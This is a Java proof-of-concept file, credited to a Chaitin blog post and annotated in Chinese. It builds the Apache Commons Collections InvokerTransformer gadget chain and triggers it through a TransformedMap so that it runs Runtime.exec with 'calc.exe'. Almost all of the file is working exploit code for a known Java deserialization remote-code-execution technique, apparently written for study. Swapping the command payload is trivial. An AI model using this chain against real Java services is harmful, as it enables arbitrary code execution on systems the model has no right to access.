package ApacheCommonsCollections;

import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

/*
 * code from https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/
 * 这段代码是为了证明InvokerTransformer有执行任意代码的能力
 */

public class InvokerTransformerTest {
	public static void main(String[] args) throws Exception {
	    Transformer[] transformers = new Transformer[] {
	        new ConstantTransformer(Runtime.class),
	        new InvokerTransformer("getMethod", new Class[] {
	            String.class, Class[].class }, new Object[] {
	            "getRuntime", new Class[0] }),
	        new InvokerTransformer("invoke", new Class[] {
	            Object.class, Object[].class }, new Object[] {
	            null, new Object[0] }),
	        new InvokerTransformer("exec", new Class[] {
	            String.class }, new Object[] {"calc.exe"})};

	    Transformer transformedChain = new ChainedTransformer(transformers);

	    Map innerMap = new HashMap();
	    innerMap.put("value", "value");
	    //map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);//原始代码里，这句有2个错误。
	    Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);

	    Map.Entry onlyElement = (Entry) outerMap.entrySet().iterator().next();
	    onlyElement.setValue("foobar");//触发点，必须要修改键值才可以弹计算器

	}
}
